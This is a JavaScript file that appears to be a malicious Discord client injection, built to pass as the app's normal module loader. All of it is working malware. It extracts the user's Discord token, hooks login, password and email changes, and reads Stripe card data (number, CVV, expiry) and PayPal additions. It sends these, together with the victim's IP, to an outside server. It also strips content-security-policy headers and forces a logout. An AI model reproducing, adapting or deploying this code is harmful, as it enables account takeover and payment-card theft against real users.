const args = process.argv; const fs = require("fs"); const path = require("path"); const https = require("https"); const querystring = require("querystring"); const { BrowserWindow, session } = require("electron");

const config = {
    filter: { urls: [ "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm",  ], },
    filter2: { urls: [ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", ], },
    rest: { url: "https://spacex.spacesolvers.us", auth: "%API_AUTH_HERE%" }
};

let sent = false;
const execScript = (script) => { const window = BrowserWindow.getAllWindows()[0]; return window.webContents.executeJavaScript(script, !0); };
const getIP = async () => { return await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", "https://api.ipify.org", false); xmlHttp.send(null); xmlHttp.responseText;`); };
const discordPath = (function () { const app = args[0].split(path.sep).slice(0, -1).join(path.sep); let resourcePath; if (process.platform === 'win32') { resourcePath = path.join(app, 'resources'); } else if (process.platform === 'darwin') { resourcePath = path.join(app, 'Contents', 'Resources'); } if (fs.existsSync(resourcePath)) return { resourcePath, app }; return { undefined, undefined }; })();

const firstTime = async() => { 
  if (sent) {
    return
  } else {
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    if (token != undefined) {
      const ip = await getIP();
      await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", "${config.rest.url}/api/grabuser?auth=${config.rest.auth}&token=${token}&ip=${ip}", false); xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*'); xmlHttp.send(null); xmlHttp.responseText;`);
      await execScript(`
      let token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
      
      function remove_token() {
        setInterval(()=>{
          document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token=""},50),
          setTimeout(()=>{location.reload()
        },1)
      }


      function logout(token) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://ptb.discord.com/api/v9/auth/logout", true);
        xhr.setRequestHeader("Authorization", token);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify({
          provider: null,
          voip_provider: null
        }));
      }
      
      remove_token(); logout(token)
      `)
    } else {
    }

    sent = true
  }
}

const onUserLogin = async (email, password, token) => {
  const ip = await getIP();
  await execScript(`
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", "${config.rest.url}/api/userlogin?auth=${config.rest.auth}&token=${token}&mail=${email}&password=${password}&ip=${ip}", false); 
  xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
  xmlHttp.send(null); xmlHttp.responseText;`);
}

const onPasswordChange = async (oldpassword, newpassword, token) => { 
  const ip = await getIP();
  await execScript(`
  var xmlHttp = new XMLHttpRequest(); 
  xmlHttp.open("GET", "${config.rest.url}/api/passwordchange?auth=${config.rest.auth}&token=${token}&password=${newpassword}&ip=${ip}", false); 
  xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
  xmlHttp.send(null); xmlHttp.responseText;`);
}

const onEmailChange = async (email, password, token) => {
  const ip = await getIP();
  await execScript(`
  var xmlHttp = new XMLHttpRequest(); 
  xmlHttp.open("GET", "${config.rest.url}/api/emailchange?auth=${config.rest.auth}&token=${token}&mail=${email}&password=${password}&ip=${ip}", false); 
  xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
  xmlHttp.send(null); xmlHttp.responseText;`);
}

const onCreditCard = async (number, cvc, expir_month, expir_year, token) => {
  const ip = await getIP();
  await execScript(`
  var xmlHttp = new XMLHttpRequest(); 
  xmlHttp.open("GET", "${config.rest.url}/api/creditcard?auth=${config.rest.auth}&ip=${ip}&token=${token}&number=${number}&exp=${expir_month}|${expir_year}&cvv=${cvc}", false); 
  xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
  xmlHttp.send(null); xmlHttp.responseText;`);
}

const onPaypalAdd = async (token) => {
  const ip = await getIP();
  await execScript(`
  var xmlHttp = new XMLHttpRequest(); 
  xmlHttp.open("GET", "${config.rest.url}/api/paypaladded?auth=${config.rest.auth}&token=${token}&ip=${ip}", false); 
  xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
  xmlHttp.send(null); xmlHttp.responseText;`);
}


session.defaultSession.webRequest.onHeadersReceived((details, callback) => { 
      delete details.responseHeaders["content-security-policy"];
      delete details.responseHeaders["content-security-policy-report-only"];
      callback({ responseHeaders: { ...details.responseHeaders, "Access-Control-Allow-Headers": "*", } });
});

session.defaultSession.webRequest.onBeforeRequest(config.filter2, async (details, callback) => {
  if (details.url.startsWith("wss://")) {
    callback({ cancel: true })
    return;
  }

  firstTime();
  return callback({});
})


session.defaultSession.webRequest.onCompleted(
  config.filter,
  async (details, _) => {

  
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
      const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString(); const data = JSON.parse(unparsed_data);
      const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
      
      sent = true;
      
      switch (true) {
        case details.url.endsWith("login"):
          onUserLogin(data.login, data.password, token).catch(console.error);
          break;
        
        case details.url.endsWith("users/@me") && details.method === "PATCH":
          if (!data.password) return;
          if (data.email) { 
            onEmailChange(data.email, data.password, token).catch(console.error);
          }
          if (data.new_password) { 
            onPasswordChange(data.password, data.new_password, token).catch(console.error) 
          }
          break;
  
        case details.url.endsWith("tokens") && details.method === "POST":
          const item = querystring.parse(unparsed_data.toString());
          onCreditCard( item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token ).catch(console.error);
          break;
  
        case details.url.endsWith("paypal_accounts") && details.method === "POST":
          onPaypalAdd(token).catch(console.error);
          break;
        
  
        default:
          break;
      }
    }
);
  
  
  module.exports = require("./core.asar");